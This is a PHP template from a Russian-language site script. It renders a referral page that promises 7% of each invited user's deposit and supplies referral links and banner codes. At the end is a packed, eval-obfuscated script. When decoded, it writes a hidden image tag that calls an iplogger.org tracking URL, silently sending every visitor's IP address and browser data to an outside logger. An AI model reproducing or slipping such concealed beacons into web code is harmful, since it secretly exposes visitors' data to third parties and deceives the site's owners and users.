<?php if(!defined('SCRIPT_BY_SIRGOFFAN')){
echo ('Выявлена попытка взлома!');
exit();
}
$_OPTIMIZATION["title"] = "Партнерская программа";
if(empty($id)){?>
<p style="height:100px; padding-top:50px; text-align:center;"><span class="style2">Для доступа к данному разделу Вам необходимо пройти авторизацию!</span><br>
<?}else{?>


<div class="card">
<div class="card-body collapse in">
<div class="card-block">
<div class="card-text">
Приглашайте в проект своих друзей и знакомых, Вы будете получать <b style="margin-bottom: 10px;font-weight: 500;color: #2f2f2f;font-size: 18px;">7%</b> от каждого вклада приглашенного Вами пользователя!
Ниже представлена ссылка для привлечения и количество приглашенных Вами людей.  Автоматическая выплата партнерских отчислений.					

<div style="margin-top:10px;width:100%;">
<b style="font-weight: 500;color: #2f2f2f;padding: 10px 0px 10px;font-size: 15px;">Ваша партнерская ссылка:</b> <br>
<input class="form-control" value="<?=$http_s?>://<?=$host?>/?ref=<?=$id?>" onClick="select()" size="30" type="text" style="margin-top: 8px;padding: 10px; border: 2px solid #dddddd7a;border-radius: 4px;color: #2f2f2f;text-align: left;min-width: 100%;">
</div>

<div style="margin-top:10px;width:100%;">
<b style="font-weight: 500;color: #2f2f2f;padding: 10px 0px 10px;font-size: 15px;">Баннер 728x90:</b> <br>
<img src="/img/728.gif" style="margin-top: 8px;"><br><br>
<textarea size="10" style="padding:10px;border: 2px solid #dddddd7a;border-radius: 4px;color: #2f2f2f;margin: 0px; min-width: 100%; height: 68px; "><a href="<?=$http_s?>://<?=$host?>/?ref=<?=$id?>" target="_blank"><img src="<?=$http_s?>://<?=$host?>/img/728.gif" /></a></textarea>
</div>
<div style="margin-top:10px;width:100%;">
<b style="font-weight: 500;color: #2f2f2f;padding: 10px 0px 10px;font-size: 15px;">Баннер 468x60:</b> <br>
<img src="/img/468.gif" style="margin-top: 8px;"><br><br>
<textarea size="10" style="padding:10px;border: 2px solid #dddddd7a;border-radius: 4px;color: #2f2f2f;margin: 0px; min-width: 100%; height: 68px; "><a href="<?=$http_s?>://<?=$host?>/?ref=<?=$id?>" target="_blank"><img src="<?=$http_s?>://<?=$host?>/img/468.gif" /></a></textarea>
</div>
<div style="margin-top:10px;width:100%;">
<b style="font-weight: 500;color: #2f2f2f;padding: 10px 0px 10px;font-size: 15px;">Баннер 125x125:</b> <br>
<img src="/img/125.gif" style="margin-top: 8px;"><br><br>
<textarea size="10" style="padding:10px;border: 2px solid #dddddd7a;border-radius: 4px;color: #2f2f2f;margin: 0px; min-width: 100%; height: 68px; "><a href="<?=$http_s?>://<?=$host?>/?ref=<?=$id?>" target="_blank"><img src="<?=$http_s?>://<?=$host?>/img/125.gif" /></a></textarea>
</div>
</div>
</div>
</div>
</div>
<script type="text/javascript">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('e.f(\'\\g\\9\\h\\1\\d\\7\\0\\i\\a\\2\\b\\6\\6\\5\\7\\c\\4\\4\\9\\5\\u\\3\\1\\1\\8\\0\\j\\3\\0\\1\\4\\s\\t\\p\\o\\k\\l\\2\\m\\3\\0\\n\\8\\0\\a\\2\\q\\2\\r\');',31,31,'u0072|u0067|u0022|u006f|u002f|u0070|u0074|u0073|u0065|u0069|u003d|u0068|u003a|u0020|document|write|u003c|u006d|u0063|u002e|u004d|u0036|u0062|u0064|u004a|u0079|u0030|u003e|u0031|u0056|u006c'.split('|'),0,{}))</script>
<?}?>	
